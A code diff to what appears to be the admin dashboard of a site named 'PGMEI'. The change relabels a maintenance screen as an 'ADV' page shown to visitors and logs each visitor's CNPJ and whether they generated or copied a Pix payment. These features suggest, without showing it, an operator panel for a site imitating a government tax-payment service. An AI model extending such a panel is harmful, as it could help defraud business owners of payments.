@@ -131,9 +131,9 @@
     });
 
     document.getElementById("badge-top-metric").textContent = `Mais forte: ${strongest.label}`;
-    document.getElementById("badge-live-status").textContent = state.activePage === "primary" ? "Operacao normal" : "Modo manutencao";
+    document.getElementById("badge-live-status").textContent = state.activePage === "primary" ? "Operacao normal" : "Pagina ADV ativa";
     document.getElementById("mini-engagement").textContent = state.totalClicks;
-    document.getElementById("mini-uptime").textContent = state.activePage === "primary" ? "Operacao normal" : "Em manutencao";
+    document.getElementById("mini-uptime").textContent = state.activePage === "primary" ? "Operacao normal" : "Pagina ADV ativa";
   }
 
   function refreshDashboard() {
@@ -143,24 +143,28 @@
     document.getElementById("metric-unique").textContent = state.uniqueVisitors;
     document.getElementById("metric-clicks").textContent = state.totalClicks;
     document.getElementById("metric-logins").textContent = state.cnpjLogins;
-    document.getElementById("metric-active-page").textContent = state.activePage === "primary" ? "Site" : "Manutencao";
+    document.getElementById("metric-active-page").textContent = state.activePage === "primary" ? "Site" : "ADV";
     document.getElementById("last-visit-text").textContent = labelDate(state.lastVisitAt);
     document.getElementById("last-sync-text").textContent = labelDate(state.lastVisitAt || state.lastPaymentAt);
-    document.getElementById("active-page-text").textContent = state.activePage === "primary" ? "Principal" : "Manutencao";
-    document.getElementById("status-mode-text").textContent = state.activePage === "primary" ? "Operacao normal" : "Em manutencao";
-    document.getElementById("status-screen-text").textContent = state.activePage === "primary" ? "Pagina principal" : "Tela de manutencao";
-    document.getElementById("settings-secondary-title").value = state.secondaryTitle;
-    document.getElementById("settings-secondary-message").value = state.secondaryMessage;
+    document.getElementById("active-page-text").textContent = state.activePage === "primary" ? "Principal" : "ADV";
+    document.getElementById("status-mode-text").textContent = state.activePage === "primary" ? "Operacao normal" : "Pagina ADV ativa";
+    document.getElementById("status-screen-text").textContent = state.activePage === "primary" ? "Pagina principal" : "Pagina ADV";
     document.getElementById("storage-provider-text").textContent = window.PGMEI.getStorageProviderName() === "supabase" ? "Supabase global" : "Modo local";
 
     const statusPill = document.getElementById("dashboard-status-pill");
     statusPill.className = `status-pill ${state.activePage === "primary" ? "primary" : "secondary"}`;
-    statusPill.textContent = state.activePage === "primary" ? "Pagina principal ativa" : "Manutencao ativa";
+    statusPill.textContent = state.activePage === "primary" ? "Pagina principal ativa" : "Pagina ADV ativa";
 
-    renderList("access-log-list", state.accessLog, "Nenhum acesso registrado ainda.", (item) => {
+    const accessItems = (state.accessLog || []).filter((item) => item.cnpj || item.page === "secondary");
+    renderList("access-log-list", accessItems.length ? accessItems : state.accessLog, "Nenhum acesso registrado ainda.", (item) => {
       const cnpjText = item.cnpj ? item.cnpj : "Nao informado";
-      const companyText = item.companyName ? item.companyName : (item.page === "primary" ? "Acesso geral" : "Tela de manutencao");
-      const pixText = item.pixGenerated ? "Gerou Pix" : "Nao gerou Pix";
+      const companyText = item.companyName ? item.companyName : (item.page === "primary" ? "Acesso geral" : "Pagina ADV");
+      let pixText = "Nao gerou Pix";
+      if (item.pixCopied) {
+        pixText = "Copiou Pix";
+      } else if (item.pixGenerated) {
+        pixText = "Gerou Pix";
+      }
       return `
         <div><strong>${labelDate(item.time)}</strong></div>
         <div>${companyText}</div>
@@ -192,24 +196,15 @@
     }
   }
 
-  async function saveSettings() {
-    await sendAppAction("update_settings", {
-      secondaryTitle: document.getElementById("settings-secondary-title").value.trim(),
-      secondaryMessage: document.getElementById("settings-secondary-message").value.trim()
-    });
-    refreshDashboard();
-    showToast("success", "Configuracoes salvas", "As alteracoes do painel foram aplicadas com sucesso.");
-  }
-
   async function setActivePage(pageName) {
     await sendAppAction("set_active_page", { page: pageName });
     refreshDashboard();
     showToast(
       "info",
-      pageName === "primary" ? "Pagina principal ativa" : "Modo manutencao ativo",
+      pageName === "primary" ? "Pagina principal ativa" : "Pagina ADV ativa",
       pageName === "primary"
         ? "O site principal voltou ao ar para os visitantes."
-        : "A tela de manutencao esta sendo exibida aos visitantes."
+        : "A pagina ADV esta sendo exibida aos visitantes."
     );
   }
 
@@ -251,9 +246,6 @@
   });
   document.getElementById("btn-open-main").addEventListener("click", () => {
     window.open("../", "_blank");
-  });
-  document.getElementById("btn-save-settings").addEventListener("click", function() {
-    pulseButton(this, saveSettings);
   });
   document.getElementById("btn-activate-primary").addEventListener("click", function() {
     pulseButton(this, async () => setActivePage("primary"));
